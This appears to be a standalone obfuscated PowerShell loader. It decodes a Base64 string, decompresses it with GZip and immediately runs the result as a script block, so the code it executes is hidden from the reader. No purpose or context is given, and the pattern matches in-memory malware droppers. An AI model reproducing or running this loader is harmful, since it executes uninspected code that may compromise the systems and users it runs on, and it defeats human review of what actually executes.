. $([ScriptBlock]::Create(([IO.StreamReader]::new((
    [IO.Compression.GZipStream]::new([IO.MemoryStream]::new(
        [Convert]::FromBase64String('
H4sIAAAAAAAAA+1UTU/CQBB9P2VDTLAH+AMNB+2BiyQmeOKGslYD7W5K/QDlv/tmUIoNbTZRDAfT
bHd2583M25nZncFiiTsUeMQtZYMurjHGiOuc457DUtul5o1yqYgRppirpdlZe+q264zaBb/K7owY
x33PHbFaMkJldUms43qOAYbUl+ghUbx4yjGjj6Rm32vwEB+IZelhEMzhPTiWoeaC/BzHihYOT0TH
mrXzBh59XHHOkdLTA+1lDmXWb9y/oTTmXqFVSxk9qkWKWAWZCyJfyLxTq7DkeLGHN2QVdoaIWItX
Iq1qpQfEs2c2ykCvxzhvBxt+8a5nE+0lqdkQE/VpFGnJRCTHf/bZ1/sai2f1+9/ZwiDFWtH+qLGr
CrXfsO9sTuduffH3LTerjfsp36mfZf/QWf8ie9mvvXbbd2WDD8gqGHI6BwAA
        ')),
        [IO.Compression.CompressionMode]'Decompress')),
    [Text.Encoding]::unicode)).ReadToEnd()
))